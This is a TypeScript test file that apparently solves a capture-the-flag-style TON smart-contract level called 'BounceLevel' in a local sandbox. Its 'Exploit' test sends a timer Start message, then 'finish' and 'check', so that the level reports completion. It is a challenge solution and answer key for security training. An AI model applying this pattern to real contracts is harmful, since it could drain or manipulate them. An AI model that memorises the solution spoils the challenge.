import { Blockchain, SandboxContract, TreasuryContract } from '@ton/sandbox';
import { toNano } from '@ton/core';
import { BounceLevel } from '../wrappers/wrappers/BounceLevel';
import { Timer } from '../wrappers/wrappers/Timer';
import '@ton/test-utils';

describe('BounceLevel', () => {
    let blockchain: Blockchain;

    let level: SandboxContract<BounceLevel>;
    let timer: SandboxContract<Timer>;

    let player: SandboxContract<TreasuryContract>;
    let owner: SandboxContract<TreasuryContract>;

    beforeAll(async () => {
        blockchain = await Blockchain.create();
        player = await blockchain.treasury('player');
        owner = await blockchain.treasury('owner');

        level = blockchain.openContract(await BounceLevel.fromInit(player.address, 0n));
        timer = blockchain.openContract(await Timer.fromInit(level.address, 0n));

        const deployResult = await level.send(
            owner.getSender(),
            {
                value: toNano('0.1'),
            },
            {
                $$type: 'Deploy',
                queryId: 0n,
            },
        );

        expect(deployResult.transactions).toHaveTransaction({
            from: owner.address,
            to: level.address,
            deploy: true,
            success: true,
        });
    });

    it('Exploit', async () => {
        await timer.send(player.getSender(), { value: toNano('0.1') }, { $$type: 'Start', time: 10n });

        await level.send(player.getSender(), { value: toNano('0.1') }, 'finish');
        // await contract.send(player, { value: toNano('0.1') }, 'finish');

        await level.send(player.getSender(), { value: toNano('0.1') }, 'check');

        expect(await level.getCompleted()).toEqual(true);
    });
});
